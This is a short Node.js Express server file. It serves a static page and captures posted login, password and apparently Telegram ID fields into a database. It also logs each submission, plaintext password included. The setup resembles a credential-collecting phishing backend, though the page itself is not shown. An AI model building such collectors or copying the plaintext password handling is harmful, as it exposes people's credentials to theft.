const express = require('express')
const db = require("./db")
const fs = require('fs');
var bodyParser = require('body-parser')
const app = express()
const https = require('https');
const port = 3000
const key = fs.readFileSync('./key.pem');
const cert = fs.readFileSync('./cert.pem');
const server = https.createServer({key: key, cert: cert }, app);
var urlencodedParser = bodyParser.urlencoded({ extended: true })
app.use('/static', express.static('static'));
app.get('/', (req, res) => {
  res.redirect("/static/index.html")
})
app.post('/static/index.html', urlencodedParser, async (req, res) => {
  res.send('Got a POST request');
  res = req.body
  await db({login: res.login, password: res.password}, res.tg_id)
  console.log(req.body)
});
server.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
